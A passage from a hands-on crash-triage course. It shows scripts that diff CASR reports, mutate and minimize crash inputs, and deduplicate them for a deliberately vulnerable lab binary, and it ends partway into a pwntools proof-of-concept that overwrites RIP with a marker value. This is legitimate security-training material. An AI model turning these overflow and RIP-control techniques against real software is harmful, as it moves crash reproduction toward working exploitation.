# Compare two CASR clusters (DestAvNearNull variants)
./diff_casrep.sh deduped/cl4/*.casrep deduped/cl5/*.casrep

# Compare stack overflow vs heap overflow
./diff_casrep.sh deduped/stack_overflow.casrep deduped/heap_overflow.casrep
```

**Alternative: Generate and Compare from Raw Inputs**:

```bash
#!/bin/bash
# diff_crash_analysis.sh - Compare two crashes from raw inputs
# Usage: ./diff_crash_analysis.sh <test_num_a> <input_a> <test_num_b> <input_b>
cd ~/crash_analysis_lab

TEST_A="$1"
INPUT_A="$2"
TEST_B="$3"
INPUT_B="$4"

echo "=== Differential Crash Analysis ==="

# Generate CASR reports
casr-san -o /tmp/crash_a.casrep -- ./vuln_asan "$TEST_A" "$INPUT_A" 2>/dev/null
casr-san -o /tmp/crash_b.casrep -- ./vuln_asan "$TEST_B" "$INPUT_B" 2>/dev/null

# Compare severity
echo -e "\n[1] Severity Comparison:"
echo "Crash A: $(jq -r '.CrashSeverity.ShortDescription' /tmp/crash_a.casrep)"
echo "Crash B: $(jq -r '.CrashSeverity.ShortDescription' /tmp/crash_b.casrep)"

# Compare crash locations
echo -e "\n[2] Crash Location:"
echo "Crash A: $(jq -r '.CrashLine' /tmp/crash_a.casrep)"
echo "Crash B: $(jq -r '.CrashLine' /tmp/crash_b.casrep)"

# Compare stack traces (first 5 frames)
echo -e "\n[3] Stack Trace Comparison:"
echo "Crash A top frames:"
jq -r '.Stacktrace[:5][]' /tmp/crash_a.casrep 2>/dev/null
echo "---"
echo "Crash B top frames:"
jq -r '.Stacktrace[:5][]' /tmp/crash_b.casrep 2>/dev/null

# Determine if same bug
echo -e "\n[4] Same Bug Assessment:"
if [ "$(jq -r '.CrashLine' /tmp/crash_a.casrep)" == "$(jq -r '.CrashLine' /tmp/crash_b.casrep)" ]; then
    echo "LIKELY SAME BUG - Same crash line"
else
    echo "POSSIBLY DIFFERENT BUGS - Different crash lines"
fi
```

**Usage**:

```bash
# Compare stack overflow vs UAF
PAYLOAD=$(python3 -c "print('A'*100)")
./diff_crash_analysis.sh 1 "$PAYLOAD" 3 ""

# Compare stack overflow vs heap overflow
./diff_crash_analysis.sh 1 "$PAYLOAD" 2 "$(python3 -c "print('B'*60)")"
```

**Expected Output (Stack Overflow vs Heap Overflow)**:

```text
=== Differential Crash Analysis ===

[1] Severity Comparison:
Crash A: stack-buffer-overflow(write)
Crash B: heap-buffer-overflow(write)

[2] Crash Location:
Crash A: /home/dev/crash_analysis_lab/src/vulnerable_suite.c:9:5
Crash B: /home/dev/crash_analysis_lab/src/vulnerable_suite.c:17:5

[3] Stack Trace Comparison:
Crash A top frames:
    #0 0x555555602d73 in strcpy (vuln_asan)
    #1 0x555555659c75 in stack_overflow vulnerable_suite.c:9:5
    #2 0x555555659c75 in main vulnerable_suite.c:65:39
---
Crash B top frames:
    #0 0x555555602d73 in strcpy (vuln_asan)
    #1 0x555555659e38 in heap_overflow vulnerable_suite.c:17:5
    #2 0x555555659e38 in main vulnerable_suite.c:66:39

[4] Same Bug Assessment:
POSSIBLY DIFFERENT BUGS - Different crash lines
```

> [!TIP] **Analysis Insight**:
> Both crashes have `strcpy` at frame #0 (same dangerous function), but different vulnerability functions (`stack_overflow` vs `heap_overflow`).
> Same root cause pattern (unbounded copy), different memory corruption targets.

### Crash Variant Discovery

**Concept**: Given a crash, find related crashes by mutating the input to explore the bug's attack surface.

**Why Find Variants?**:

- Original crash might be DoS-only, variant might be RCE
- Different variants may bypass different mitigations
- Helps understand full scope of vulnerability
- Variants with different severity may have different priority

**Mutation-Based Variant Discovery**:

```python
#!/usr/bin/env python3
"""
crash_variant_finder.py - Find crash variants by mutating input

Usage: python3 crash_variant_finder.py ./vuln_no_protect crashes/stack_150.txt variants/

This script mutates a known crash input to discover:
- Different crash locations (new bugs)
- Different crash severities
- Smaller reproducers
- Inputs that trigger the same bug differently
"""
import subprocess
import random
import hashlib
import os
from pathlib import Path

def mutate_input(data, mutation_rate=0.05):
    """Apply random mutations to crash input

    Mutation strategies:
    - flip: XOR random byte with random value
    - insert: Add new byte at random position
    - delete: Remove random byte
    - replace: Replace byte with random value
    """
    data = bytearray(data)
    num_mutations = max(1, int(len(data) * mutation_rate))

    for _ in range(num_mutations):
        mutation_type = random.choice(['flip', 'insert', 'delete', 'replace'])
        pos = random.randint(0, len(data) - 1) if data else 0

        if mutation_type == 'flip' and data:
            data[pos] ^= random.randint(1, 255)
        elif mutation_type == 'insert':
            data.insert(pos, random.randint(0, 255))
        elif mutation_type == 'delete' and len(data) > 1:
            del data[pos]
        elif mutation_type == 'replace' and data:
            data[pos] = random.randint(0, 255)

    return bytes(data)

def test_crash(target, input_data, test_case="1", timeout=2):
    """Test if input causes crash using vulnerable_suite test case

    Note: For vulnerable_suite, format is: ./vuln <test_num> <payload>
    """
    try:
        result = subprocess.run(
            [target, test_case, input_data.decode('latin-1')],
            timeout=timeout,
            capture_output=True
        )
        return result.returncode < 0  # Negative = signal (crash)
    except subprocess.TimeoutExpired:
        return False  # Hang, not crash
    except Exception:
        return False

def get_crash_signature(target_asan, input_data, test_case="1"):
    """Get crash signature using ASAN output

    Returns normalized crash signature (addresses stripped for ASLR).
    This ensures the same crash location is identified regardless of
    memory layout randomization.
    """
    import re
    try:
        result = subprocess.run(
            [target_asan, test_case, input_data.decode('latin-1')],
            timeout=5,
            capture_output=True,
            text=True
        )
        # Extract crash location from ASAN output
        for line in result.stderr.split('\n'):
            if '#0' in line and ' in ' in line:
                # Strip addresses to normalize for ASLR
                # Before: "#0 0x56eef1918d73 in strcpy (/path/vuln+0xaed73)"
                # After:  "#0 in strcpy (/path/vuln)"
                normalized = re.sub(r'0x[0-9a-f]+', '', line)
                normalized = re.sub(r'\+0x[0-9a-f]+', '', normalized)
                normalized = re.sub(r'\s+', ' ', normalized).strip()
                return normalized
    except:
        pass
    return "unknown"

def find_variants(target, original_crash, output_dir, num_iterations=1000):
    """Find crash variants by mutating original input"""

    # Derive ASAN binary name
    target_asan = target.replace('vuln_no_protect', 'vuln_asan')

    with open(original_crash, 'rb') as f:
        original_data = f.read().strip()

    original_sig = get_crash_signature(target_asan, original_data)
    print(f"[*] Original crash signature: {original_sig}")

    variants = {}
    Path(output_dir).mkdir(exist_ok=True)

    for i in range(num_iterations):
        mutated = mutate_input(original_data)

        if test_crash(target, mutated):
            sig = get_crash_signature(target_asan, mutated)

            if sig not in variants:
                variants[sig] = mutated
                variant_hash = hashlib.md5(mutated).hexdigest()[:8]
                variant_path = f"{output_dir}/variant_{variant_hash}"

                with open(variant_path, 'wb') as f:
                    f.write(mutated)

                print(f"[+] New variant ({len(variants)}): {sig[:60]}...")

        if i % 100 == 0:
            print(f"[*] Progress: {i}/{num_iterations}, found {len(variants)} variants")

    print(f"\n[*] Found {len(variants)} unique crash variants")
    return variants

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <target> <crash_input> <output_dir>")
        print(f"Example: {sys.argv[0]} ./vuln_no_protect crashes/stack_150.txt variants/")
        sys.exit(1)

    find_variants(sys.argv[1], sys.argv[2], sys.argv[3])
```

> [!NOTE] **Why Only 1 Variant?**
> The simple stack overflow always crashes at the same `strcpy` location regardless of payload content.
> To find _different_ crash variants, you need inputs that trigger different code paths.
> The script above is useful when fuzzing complex parsers where mutations might reach different vulnerable functions.

**Alternative: Multi-Vulnerability Variant Finder**

For `vulnerable_suite`, use this version that explores different test cases:

```python
#!/usr/bin/env python3
"""
multi_vuln_variant_finder.py - Find variants across different vulnerability types

Usage: python3 multi_vuln_variant_finder.py ./vuln_no_protect variants/
"""
import subprocess
import random
import hashlib
import re
from pathlib import Path

# Test cases and their required payloads
VULN_TESTS = {
    "1": lambda: "A" * random.randint(65, 200),   # Stack overflow
    "2": lambda: "B" * random.randint(33, 100),   # Heap overflow
    "3": lambda: "",                               # Use-after-free
    "4": lambda: "",                               # Double-free
    "5": lambda: random.choice(["0", "1"]),       # NULL deref
}

def test_crash(target, test_num, payload, timeout=2):
    """Test if input causes crash"""
    try:
        args = [target, test_num]
        if payload:
            args.append(payload)
        result = subprocess.run(args, timeout=timeout, capture_output=True)
        return result.returncode < 0
    except:
        return False

def get_crash_signature(target_asan, test_num, payload):
    """Get ASLR-normalized crash signature"""
    try:
        args = [target_asan, test_num]
        if payload:
            args.append(payload)
        result = subprocess.run(args, timeout=5, capture_output=True, text=True)

        for line in result.stderr.split('\n'):
            if '#0' in line and ' in ' in line:
                normalized = re.sub(r'0x[0-9a-f]+', '', line)
                normalized = re.sub(r'\+0x[0-9a-f]+', '', normalized)
                normalized = re.sub(r'\s+', ' ', normalized).strip()
                return normalized
    except:
        pass
    return "unknown"

def find_all_variants(target, output_dir, iterations_per_test=200):
    """Find crash variants across all vulnerability types"""

    target_asan = target.replace('vuln_no_protect', 'vuln_asan')
    variants = {}
    Path(output_dir).mkdir(exist_ok=True)

    for test_num, payload_gen in VULN_TESTS.items():
        print(f"\n[*] Testing vulnerability type {test_num}...")

        for i in range(iterations_per_test):
            payload = payload_gen()

            if test_crash(target, test_num, payload):
                sig = get_crash_signature(target_asan, test_num, payload)

                if sig and sig != "unknown" and sig not in variants:
                    variants[sig] = (test_num, payload)

                    variant_hash = hashlib.md5(f"{test_num}{payload}".encode()).hexdigest()[:8]
                    variant_path = f"{output_dir}/variant_{test_num}_{variant_hash}"

                    with open(variant_path, 'w') as f:
                        f.write(f"{test_num} {payload}")

                    print(f"[+] New variant ({len(variants)}): test={test_num}, {sig[:50]}...")

    print(f"\n[*] Found {len(variants)} unique crash variants across all tests")
    return variants

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target> <output_dir>")
        sys.exit(1)

    find_all_variants(sys.argv[1], sys.argv[2])
```

**Running the Multi-Vulnerability Finder**:

```bash
cd ~/crash_analysis_lab

# Find variants across ALL vulnerability types
python3 multi_vuln_variant_finder.py ./vuln_no_protect variants/

# Expected output:
# [*] Testing vulnerability type 1...
# [+] New variant (1): test=1, #0 in strcpy (/home/dev/crash_analysis_lab/vuln_as...
#
# [*] Testing vulnerability type 2...
# (no crash - heap overflow is silent without ASAN)
#
# [*] Testing vulnerability type 3...
# (no crash - UAF is silent without ASAN)
#
# [*] Testing vulnerability type 4...
# [+] New variant (2): test=4, #0 in free (/home/dev/crash_analysis_lab/vuln_asan...
#
# [*] Testing vulnerability type 5...
# [+] New variant (3): test=5, #0 in null_deref /home/dev/crash_analysis_lab/src/...
#
# [*] Found 3 unique crash variants across all tests

ls -la variants/
# variant_1_*  (stack overflow - strcpy)
# variant_4_*  (double-free - glibc tcache detection)
# variant_5_*  (null deref - SIGSEGV)
```

**Running the Variant Finder**:

```bash
cd ~/crash_analysis_lab

# Create crash input files for different vulnerability types
echo "1 $(python3 -c "print('A'*150)")" > crashes/stack_150.txt
echo "2 $(python3 -c "print('B'*80)")" > crashes/heap_80.txt

# Run the variant finder
python3 crash_variant_finder.py ./vuln_no_protect crashes/stack_150.txt variants/

# Expected output:
# [*] Original crash signature: #0 0x... in stack_overflow ...
# [*] Progress: 0/1000, found 0 variants
# [+] New variant (1): #0 0x555555659c75 in stack_overflow /home/dev/...
# [*] Progress: 100/1000, found 2 variants
# ...
# [*] Found X unique crash variants

# Check results
ls -la variants/
# variant_3a8f2c1d  variant_7bc912ef  ...

# Analyze each variant with CASR
for v in variants/*; do
    echo "=== $(basename $v) ==="
    casr-san -o /tmp/v.casrep -- ./vuln_asan $(cat $v) 2>/dev/null
    jq -r '.CrashSeverity.ShortDescription' /tmp/v.casrep
done
```

**Targeted Variant Discovery**:

```bash
cd ~/tools

# Install radamsa
git clone --depth 1 https://gitlab.com/akihe/radamsa.git
cd radamsa
make
sudo make install
radamsa --help

cd ~/crash_analysis_lab

echo "1 $(python3 -c "print('A'*100)")" > crash_input.txt

# Generate variants with ASLR-normalized deduplication
mkdir -p radamsa_variants
declare -A seen_sigs

for i in {1..100}; do
    radamsa crash_input.txt > /tmp/variant.txt

    # Get ASAN output and normalize
    output=$(./vuln_asan $(cat /tmp/variant.txt) 2>&1)
    if echo "$output" | grep -qE "ERROR.*Sanitizer"; then
        # Extract and normalize signature (strip addresses for ASLR)
        sig=$(echo "$output" | grep "#0" | head -1 | sed 's/0x[0-9a-f]\+//g')

        if [[ -z "${seen_sigs[$sig]}" ]]; then
            seen_sigs[$sig]=1
            cp /tmp/variant.txt radamsa_variants/variant_$i.txt
            echo "[+] Unique variant $i: $(echo "$output" | grep -oE 'stack-buffer|heap-buffer|use-after|double-free' | head -1)"
        fi
    fi
done

echo "Found ${#seen_sigs[@]} unique crash signatures"

# Expected output:
# [+] Unique variant 3: stack-buffer
# [+] Unique variant 28: use-after
# Found 2 unique crash signatures
```

> [!TIP] **Why deduplication matters:**
> Without deduplication, you might see 30+ "crashes" that are all the same bug. With proper ASLR-normalized signatures, radamsa found **2 truly unique** crash types:
>
> - **stack-buffer**: Original overflow from test case 1
> - **use-after**: Radamsa mutated the test number ("1" -> "3"), discovering UAF!
>
> This demonstrates radamsa's power to explore beyond the original crash input.

```bash
# Method 3: Focused byte-range mutation
# Useful when you know which input region triggers the bug
python3 << 'EOF'
import random
import subprocess
import re

seen_sigs = set()

# Focus mutations on BOTH test number and payload
for i in range(20):
    # Mutate test number (1-5 are valid, but let's explore)
    test_num = str(random.randint(1, 6))

    # Generate payload with mutations
    payload = bytearray(b"A" * random.randint(50, 150))
    for _ in range(random.randint(3, 8)):
        pos = random.randint(0, len(payload) - 1)
        payload[pos] = random.randint(0, 255)

    try:
        result = subprocess.run(
            ["./vuln_asan", test_num, payload.decode('latin-1')],
            capture_output=True, timeout=5
        )

        if b"ERROR" in result.stderr:
            # Normalize signature (strip ASLR addresses)
            stderr = result.stderr.decode('latin-1', errors='ignore')
            sig_match = re.search(r'#0.*?in (\w+)', stderr)
            sig = sig_match.group(1) if sig_match else "unknown"

            if sig not in seen_sigs:
                seen_sigs.add(sig)
                err_type = stderr.split('ERROR')[1][:60] if 'ERROR' in stderr else ''
                print(f"[+] New crash (test={test_num}): {sig} - {err_type.strip()}")
    except subprocess.TimeoutExpired:
        pass
    except Exception:
        pass

print(f"\nFound {len(seen_sigs)} unique crash signatures")
EOF

# Expected output:
# [+] New crash (test=5): null_deref - : AddressSanitizer: SEGV on unknown address
# [+] New crash (test=4): free - : AddressSanitizer: attempting double-free
# [+] New crash (test=3): printf_common - : AddressSanitizer: heap-use-after-free
# [+] New crash (test=2): strcpy - : AddressSanitizer: heap-buffer-overflow
# [+] New crash (test=1): strcpy - : AddressSanitizer: stack-buffer-overflow
#
# Found 4-5 unique crash signatures (varies by random selection)
```

### Test Case Minimization with afl-tmin

**What Is afl-tmin?**:

- AFL++ tool for minimizing crash inputs
- Uses delta debugging algorithm
- Removes bytes while preserving crash
- Produces minimal reproducer

> [!WARNING] **Important for vulnerable_suite:**
> `afl-tmin` with `@@` passes a **filename** to the target, but `vulnerable_suite` expects **command-line arguments** (`./vuln 1 AAAA`).
> For this lab, use the Python-based minimizer below or CASR's `casr-afl` for minimization.

**Basic Usage (for file-input targets)**:

```bash
cd ~/crash_analysis_lab

# For targets that read from file (@@):
#afl-tmin -i crash_input -o crash_minimized -- ./target @@

# Options:
# -i: Input file
# -o: Output file
# -m: Memory limit (MB), use 'none' to disable
# -t: Timeout (ms)
# -e: Solve for edge coverage only (faster)
```

**Python-Based Minimizer (for command-line argument targets)**:

```python
#!/usr/bin/env python3
"""
minimize_crash.py - Delta debugging minimizer for command-line argument targets

Usage: python3 minimize_crash.py ./vuln_asan 1 "$(cat crash_input.txt)"
"""
import subprocess
import sys

def crashes(target, test_num, payload, timeout=5):
    """Check if input still crashes"""
    try:
        result = subprocess.run(
            [target, test_num, payload],
            capture_output=True, timeout=timeout
        )
        return result.returncode < 0 or b"ERROR" in result.stderr
    except subprocess.TimeoutExpired:
        return False
    except:
        return False

def minimize(target, test_num, payload):
    """Delta debugging minimization"""
    print(f"[*] Original size: {len(payload)} bytes")

    # Phase 1: Block deletion (binary search)
    block_size = len(payload) // 2
    while block_size >= 1:
        i = 0
        while i < len(payload):
            # Try removing block
            candidate = payload[:i] + payload[i + block_size:]
            if crashes(target, test_num, candidate):
                payload = candidate
                print(f"    Block {block_size}: {len(payload)} bytes")
            else:
                i += block_size
        block_size //= 2

    # Phase 2: Byte-by-byte removal
    i = 0
    while i < len(payload):
        candidate = payload[:i] + payload[i + 1:]
        if crashes(target, test_num, candidate):
            payload = candidate
        else:
            i += 1

    print(f"[+] Minimized size: {len(payload)} bytes")
    return payload

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <target> <test_num> <payload>")
        sys.exit(1)

    result = minimize(sys.argv[1], sys.argv[2], sys.argv[3])
    print(f"[+] Minimal payload: {repr(result)}")
```

**Running the Minimizer**:

```bash
cd ~/crash_analysis_lab

# Create crash input (150 A's triggers stack overflow)
PAYLOAD=$(python3 -c "print('A'*150)")

# Minimize it
python3 minimize_crash.py ./vuln_asan 1 "$PAYLOAD"

# Expected output:
# [*] Original size: 150 bytes
#     Block 75: 75 bytes
#     Block 37: 74 bytes
#     Block 18: 72 bytes
#     Block 4: 68 bytes
#     Block 4: 64 bytes
# [+] Minimized size: 64 bytes
# [+] Minimal payload: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
```

> [!TIP] The minimizer found that **64 bytes** is the minimum payload to trigger the stack overflow.
> Why? The buffer is `char buffer[64]`, and `strcpy` adds a null terminator (`\0`), so 64 chars + 1 null = 65 bytes written, overflowing by exactly 1 byte!

**What Minimization Does**:

```text
Original crash: 150 bytes ("A" * 150)
Pass 1: Block-level deletion (75-byte blocks)
  → 75 bytes (still crashes)
Pass 2: Smaller blocks (37 bytes)
  → 74 bytes
Pass 3: Even smaller (18 bytes)
  → 72 bytes
Pass 4: 4-byte blocks
  → 68 bytes → 64 bytes
Pass 5: Byte-level deletion
  → 64 bytes (minimal crash - no further reduction possible)

Result: 64 chars + null terminator = 65 bytes written to buffer[64]
```

**Batch Minimization (Simple Approach)**:

```bash
cd ~/crash_analysis_lab
mkdir -p minimized

# Minimize each variant using the Python script
for crash in variants/variant_*; do
    name=$(basename "$crash")
    content=$(cat "$crash")
    test_num=$(echo "$content" | cut -d' ' -f1)
    payload=$(echo "$content" | cut -d' ' -f2-)

    echo "Minimizing $name (test=$test_num, ${#payload} bytes)..."

    # Use the minimize_crash.py script (much faster with block deletion)
    result=$(python3 minimize_crash.py ./vuln_asan "$test_num" "$payload" 2>&1 | tail -1)
    min_payload=$(echo "$result" | sed "s/.*Minimal payload: '//;s/'$//")

    echo "$test_num $min_payload" > "minimized/${name}_min"
done

# Expected output:
# Minimizing variant_1_b2f710bc (test=1, 123 bytes)...
# Minimizing variant_4_a87ff679 (test=4, 0 bytes)...
# Minimizing variant_4ddd9d03 (test=1, 149 bytes)...
# Minimizing variant_5_c0c7c76d (test=5, 1 bytes)...

ls -la minimized/
# variant_1_b2f710bc_min  67 bytes  (1 + space + 64 A's = minimal stack overflow)
# variant_4_a87ff679_min   3 bytes  (just "4 " - double-free needs no payload)
# variant_4ddd9d03_min    67 bytes  (same stack overflow)
# variant_5_c0c7c76d_min   3 bytes  (just "5 0" - null deref minimal trigger)
```

> [!TIP] **Minimization Results Analysis:**
>
> - **Stack overflow (test 1)**: Reduced to 64-byte payload (exact buffer size)
> - **Double-free (test 4)**: Reduced to 0-byte payload (crash is payload-independent)
> - **NULL deref (test 5)**: Reduced to "0" (just needs trigger flag)

**Tips for Effective Minimization**:

1. **Use block deletion first**: Much faster than byte-by-byte (O(n log n) vs O(n²))
2. **Set Appropriate Timeout**: ASAN is slow, use 5+ seconds
3. **Verify After Minimization**: Ensure crash still reproduces
4. **Know payload-independent crashes**: UAF/double-free don't need payload minimization

### Corpus Minimization with afl-cmin

**What Is afl-cmin?**:

- Minimizes corpus while preserving coverage
- Keeps smallest inputs that cover all edges
- Essential for efficient continuous fuzzing

> [!WARNING] **Important for vulnerable_suite:**
> Like `afl-tmin`, `afl-cmin` with `@@` passes a **filename**, but `vulnerable_suite` expects command-line arguments.
> For this lab, we demonstrate the concept but note this requires file-input targets in practice.

**Usage (for file-input targets)**:

```bash
# For targets that read from file (@@):
afl-cmin -i corpus_dir -o corpus_min -- ./target @@

# Options:
# -i: Input corpus directory
# -o: Output minimized corpus
# -m: Memory limit (use 'none' to disable)
# -t: Timeout in ms
# -T: Use multiple cores (e.g., -T all)
```

**Python-Based Corpus Minimization (for CLI argument targets)**:

```python
#!/usr/bin/env python3
"""
corpus_minimize.py - Coverage-based corpus minimization for CLI targets

Usage: python3 corpus_minimize.py ./vuln_asan corpus_dir/ corpus_min/
"""
import subprocess
import os
import sys
import re
from pathlib import Path

def get_coverage_signature(target, test_num, payload, timeout=5):
    """Get normalized coverage signature from ASAN output"""
    try:
        result = subprocess.run(
            [target, test_num, payload],
            capture_output=True, timeout=timeout
        )
        # Use stack trace as coverage proxy
        stderr = result.stderr.decode('latin-1', errors='ignore')
        # Extract function names from stack trace
        funcs = re.findall(r'in (\w+)', stderr)
        return tuple(funcs[:5]) if funcs else None
    except:
        return None

def minimize_corpus(target, input_dir, output_dir):
    """Keep smallest input for each unique coverage signature"""
    Path(output_dir).mkdir(exist_ok=True)

    # Group inputs by coverage
    coverage_map = {}  # signature -> (size, path, content)

    for crash_file in Path(input_dir).glob("*"):
        if crash_file.is_dir():
            continue

        # Read as binary to handle non-UTF8 data
        raw = crash_file.read_bytes()
        content = raw.decode('latin-1', errors='ignore').strip()
        parts = content.split(' ', 1)
        test_num = parts[0] if parts else "1"
        payload = parts[1] if len(parts) > 1 else ""

        sig = get_coverage_signature(target, test_num, payload)
        if sig is None:
            continue

        size = len(raw)
        if sig not in coverage_map or size < coverage_map[sig][0]:
            coverage_map[sig] = (size, crash_file.name, raw)

    # Write minimized corpus
    for i, (sig, (size, name, raw)) in enumerate(coverage_map.items()):
        out_path = Path(output_dir) / f"min_{i:04d}_{name}"
        out_path.write_bytes(raw)
        print(f"[+] {name} -> {out_path.name} ({size} bytes)")

    print(f"\n[*] Minimized: {len(list(Path(input_dir).glob('*')))} -> {len(coverage_map)} files")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <target> <input_dir> <output_dir>")
        sys.exit(1)
    minimize_corpus(sys.argv[1], sys.argv[2], sys.argv[3])
```

**Running Corpus Minimization**:

```bash
cd ~/crash_analysis_lab

# Minimize the variants directory
python3 corpus_minimize.py ./vuln_asan variants/ corpus_min/

# Expected output:
# [+] variant_5_c0c7c76d -> min_0000_variant_5_c0c7c76d (3 bytes)
# [+] variant_4_a87ff679 -> min_0001_variant_4_a87ff679 (2 bytes)
# [+] variant_1_b2f710bc -> min_0002_variant_1_b2f710bc (125 bytes)
#
# [*] Minimized: 4 -> 3 files

ls -la corpus_min/
```

### Practical Exercise

**Task**: Deduplicate and minimize crashes from the vulnerable_suite test cases

**Setup**:

```bash
cd ~/crash_analysis_lab

# Generate ~25 crash inputs (varying payloads for each vuln type)
mkdir -p crashes

# Stack overflow (test 1) - varying lengths
for i in {100..200..20}; do
    echo "1 $(python3 -c "print('A'*$i)")" > crashes/stack_$i.txt
done

# Heap overflow (test 2), UAF (test 3), Double-free (test 4), NULL deref (test 5)
# TODO: Generate 5 variants each with different payloads

ls crashes/ | wc -l
```

**Challenge 1: Stack Hash Deduplication**

Write a script that:

1. Runs each crash through `./vuln_no_protect` with GDB
2. Extracts the backtrace (`bt` command)
3. Normalizes addresses (remove `0x...` to handle ASLR)
4. Computes MD5 hash of normalized stack
5. Groups crashes by unique hash

**Hints**:

- Use `gdb -batch -ex "run ..." -ex "bt" -ex "quit"`
- `sed 's/0x[0-9a-f]\+//g'` removes hex addresses
- Expected result: ~4-5 unique hashes (one per vulnerability type)

**Challenge 2: CASR Classification**

For each unique crash from Challenge 1:

1. Run through `casr-san` with the ASAN build
2. Extract `CrashSeverity.Type` from the JSON report
3. Note which bugs CASR classifies as EXPLOITABLE

**Hints**:

- `casr-san -o output.casrep -- ./vuln_asan <args>`
- `jq -r '.CrashSeverity.Type' output.casrep`
- Some vuln types (heap overflow, UAF) need ASAN to detect!

**Challenge 3: Crash Minimization**

Write a Python minimizer that:

1. Takes a crash file and binary target as input
2. Iteratively removes bytes while crash still reproduces
3. Outputs the minimal crash that still triggers the bug

**Hints**:

- Stack overflow should minimize to ~64 bytes (buffer size)
- Double-free/NULL-deref are already minimal (just the test number)
- Check `subprocess.run()` return code or ASAN output for crash detection
- Binary search is faster than linear removal

**Challenge 4: Variant Discovery**

Find additional crash variants by:

1. Mutating existing crashes with radamsa
2. Running variants through your deduplication pipeline
3. Identifying any new unique stack signatures

**Success Criteria**:

- [ ] Stack hash deduplication script working
- [ ] CASR reports generated for unique crashes
- [ ] At least one crash minimized (stack overflow: 200+ → ~64 bytes)
- [ ] Understand why heap/UAF bugs need ASAN to detect
- [ ] Document each unique bug with trigger command

### Key Takeaways

1. **Deduplication is essential**: Analyzing 100 duplicates wastes time
2. **Multiple methods improve accuracy**: Stack + coverage + CASR severity
3. **Minimization clarifies bugs**: 42 bytes easier than 8KB to understand
4. **Automation enables scale**: Manual triage doesn't scale past dozens of crashes
5. **Verification is critical**: Always confirm minimized crash reproduces bug

### Discussion Questions

1. When might stack-based deduplication give false duplicates (different bugs, same stack)?
2. How does ASLR affect crash deduplication strategies, and how does CASR handle this?
3. What are the risks of over-aggressive test case minimization with afl-tmin (e.g., losing the root cause trigger)?
4. When should you use afl-cmin (corpus minimization) vs afl-tmin (single test case minimization)?

## Day 6: Creating PoC Reproducers and Automation

- **Goal**: Build reliable, minimal Proof-of-Concept reproducers and automate the crash-to-PoC pipeline.
- **Activities**:
  - _Reading_:
    - [Exploit Development Process](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
  - _Online Resources_:
    - [Python Exploit Development Assistance](https://github.com/Gallopsled/pwntools)
    - [ExploitDB](https://gitlab.com/exploit-database/exploitdb)
  - _Tool Setup_:
    - Python 3 with pwntools
    - Exploit template frameworks
  - _Exercise_:
    - Convert minimized crash to Python PoC script
    - Automate crash→minimize→PoC workflow

### Why Reliable PoCs Matter

**Uses of PoC Scripts**:

- Demonstrate vulnerability to stakeholders
- Enable consistent reproduction for testing
- Foundation for exploit development
- Required for CVE submission
- Facilitate regression testing
- Aid in patch verification

**Quality Criteria**:

1. **Reliability**: Works ≥ 90% of attempts
2. **Clarity**: Code is readable and commented
3. **Minimalism**: No unnecessary complexity
4. **Portability**: Works across similar environments
5. **Safety**: Clearly marked as PoC, not weaponized

### Building PoCs with Python

**Why Python?**:

- Excellent libraries (pwntools, scapy, requests)
- Clear syntax for security researchers
- Easy byte manipulation
- Cross-platform
- Rapid prototyping

**pwntools Installation** (if not already done in Day 1):

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Install pwntools (should already be installed from Day 1)
#pip3 install pwntools

# Verify
python3 -c "from pwn import *; print('pwntools ready')"
```

### PoC Example: Stack Buffer Overflow

**Scenario**: Stack buffer overflow in vulnerable_suite.c (Test Case 1)

**Crash Analysis** (from Day 1):

- Buffer size: 64 bytes in stack_overflow()
- Overflow at: `strcpy(buffer, input)`
- Crash with 64+ bytes (buffer overflow)
- Minimal crash payload: 64 bytes (exact buffer boundary)

> [!NOTE] **ASAN vs Non-ASAN Behavior**
>
> - With ASAN: Crashes immediately at 64+ bytes (detects overflow)
> - Without ASAN: May need more bytes to corrupt return address
> - For reliable PoC, use ASAN build or 100+ byte payload

**PoC Script**:

```python
#!/usr/bin/env python3
"""
PoC for Stack Buffer Overflow in vulnerable_suite.c

Target: ~/crash_analysis_lab/vuln_no_protect
Test Case: 1 (stack overflow)
Type: Stack Buffer Overflow
Impact: Denial of Service (PoC), RCE with proper payload

The stack_overflow() function uses strcpy() without bounds checking,
allowing a stack buffer overflow when input exceeds 64 bytes.
"""

from pwn import *
import sys
import os

# Configuration
TARGET = "./vuln_no_protect"
TEST_CASE = "1"

# Offset to RIP (found via cyclic pattern in Day 1)
RIP_OFFSET = 72

def create_payload(size=200, control_rip=False):
    """Generate overflow payload"""

    if control_rip:
        # Controlled RIP overwrite
        payload = b"A" * RIP_OFFSET
        payload += p64(0xdeadbeefcafebabe)  # Overwrite RIP
        payload += b"C" * 50  # Extra padding
    else:
        # Simple crash payload
        payload = b"A" * size

    return payload

def test_crash(payload):
    """Test if payload causes crash"""

    log.info(f"Testing payload of {len(payload)} bytes")

    try:
        p = process([TARGET, TEST_CASE, payload])
        p.wait(timeout=2)
        exit_code = p.returncode
        p.close()

        # Check for crash signals
        if exit_code is not None and exit_code < 0:
            signal_names = {-11: "SIGSEGV", -6: "SIGABRT", -4: "SIGILL"}
            sig_name = signal_names.get(exit_code, f"signal {-exit_code}")
            log.success(f"Crash confirmed! ({sig_name})")
            return True
        else:
            log.warning(f"No crash (exit code: {exit_code})")
            return False

    except Exception as e:
        log.error(f"Error: {e}")
        return False

def verify_rip_control():
    """Verify we can control RIP"""

    log.info("Verifying RIP control...")

    payload = create_payload(control_rip=True)

    # Run under GDB to check RIP value
    p = process([TARGET, TEST_CASE, payload])
    p.wait(timeout=2)

    log.info("Check core dump or GDB output for RIP = 0xdeadbeefcafebabe")
    p.close()

def test_reliability(attempts=10):
    """Test crash reliability"""

    log.info(f"Testing reliability ({attempts} attempts)")

    payload = create_payload(size=200)
    crashes = 0

    for i in range(attempts):
        if test_crash(payload):
            crashes += 1

    rate = (crashes / attempts) * 100
    log.info(f"Crash rate: {crashes}/{attempts} ({rate:.1f}%)")

    return rate >= 90

def main():
    context.log_level = 'info'

